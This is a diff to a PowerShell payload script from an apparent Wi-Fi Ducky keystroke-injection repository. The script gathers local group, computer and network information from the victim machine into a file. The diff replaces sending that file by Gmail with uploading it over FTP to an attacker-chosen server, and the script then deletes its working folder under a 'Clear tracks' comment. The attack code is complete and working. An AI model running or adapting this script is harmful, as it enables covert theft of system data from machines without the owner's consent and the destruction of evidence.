@@ -1,9 +1,9 @@
 # Written by HonkinWaffles https://github.com/HonkinWaffles/Wi-Fi-Ducky-Scripts
 # Description: Powershell Script to collect data on the local machine and email it to a external source (Gmail)
 
-# <SENDER EMAIL ADDRESS> - Gmail account of the sender
-# <SENDER PASSWORD> - Gmail account password
-# <RECEPIENT EMAIL ADDRESS> - Recepient email address (Can be same as sender)
+# !! CHANGES REQUIRED !!
+# <FTP_SERVER> - IP/PORT of the FTP server you want to upload to 
+# Credentials if anonymous is not enabled
 
 # Set Directory
 $path = "C:\temp\234f23"
@@ -28,18 +28,25 @@ Get-LocalGroup | Out-File -Append $filename
 Get-Computerinfo | Out-File -Append $filename
 Get-NetIPAddress | Out-File -Append $filename
 
-# Email results
-$FROM = "<SENDER EMAIL ADDRESS>"
-$PASS = "<SENDER PASSWORD>"
-$TO = "<RECEPIENT EMAIL ADDRESS>"
+# FTP file prep
+$server = '<FTP_SERVER>'
+$ftp = [System.Net.FtpWebRequest]::Create("ftp://$server/$filename")
+$ftp = [System.Net.FtpWebRequest]$ftp
+$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
+$ftp.Credentials = new-object System.Net.NetworkCredential("anonymous","anonymous@$server")
+$content = [System.IO.File]::ReadAllBytes("$path\$filename")
+$ftp.ContentLength = $content.Length
+$ftp.UseBinary = $true
+$ftp.UsePassive = $true
 
-$PC_NAME = "$env:computername"
-$SUBJECT = "Wi-Fi Ducky Data Collection - " + $PC_NAME
-$BODY = "All the data about  " + $PC_NAME + " is in the attached file."
-$ATTACH = '23rtg4t.txt'
+$content = [System.IO.File]::ReadAllBytes("$path\$filename")
+$ftp.ContentLength = $content.Length
 
-Send-MailMessage -SmtpServer "smtp.gmail.com" -Port 587 -From ${FROM} -to ${TO} -Subject ${SUBJECT} -Body ${BODY} -Attachment ${ATTACH} -Priority High -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ${FROM}, (ConvertTo-SecureString -String ${PASS} -AsPlainText -force))
-
+# Send file
+$rs = $ftp.GetRequestStream()
+$rs.Write($content, 0, $content.Length)
+$rs.Close()
+$rs.Dispose()
 # Clear tracks
 Set-location 'C:\'
 Remove-Item -Path 'C:\temp\234f23' -Recurse -Force
